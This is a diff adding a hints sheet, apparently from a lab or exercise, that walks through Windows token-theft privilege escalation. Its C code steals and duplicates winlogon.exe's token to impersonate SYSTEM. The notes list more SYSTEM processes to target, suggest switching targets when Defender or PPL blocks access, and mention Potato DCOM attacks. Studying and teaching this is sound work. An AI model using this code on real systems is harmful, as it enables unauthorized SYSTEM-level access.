@@ -1,0 +1,35 @@
+=== HINT 1: Find target process ===
+DWORD pid = find_process("winlogon.exe");
+
+=== HINT 2: Open and steal token ===
+HANDLE hProc  = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+HANDLE hToken = NULL;
+OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken);
+CloseHandle(hProc);
+
+=== HINT 3: Duplicate token ===
+HANDLE hDupToken = NULL;
+DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
+    SecurityImpersonation, TokenImpersonation, &hDupToken);
+CloseHandle(hToken);
+
+=== HINT 4: Impersonate ===
+ImpersonateLoggedOnUser(hDupToken);
+// Now current thread is SYSTEM
+
+=== HINT 5: Verify + revert ===
+char user[128]; DWORD len = sizeof(user);
+GetUserNameA(user, &len);
+printf("impersonating: %s\n", user);  // "SYSTEM"
+RevertToSelf();
+
+=== KEY INSIGHT ===
+TokenImpersonation: only current thread is affected.
+CreateProcessWithTokenW: launch a new process as the token's user (requires SeAssignPrimaryTokenPrivilege).
+Token types:
+  Primary token: assigned to processes at creation.
+  Impersonation token: assigned to threads (used for impersonation).
+Common SYSTEM processes: winlogon, lsass, services, spoolsv.
+Defender/PPL may block OpenProcess on some targets - try other SYSTEM processes.
+Potato attacks (Juicy, Rotten, Sweet): abuse DCOM impersonation to steal SYSTEM token
+  from a service that connects back to an attacker-controlled COM server.
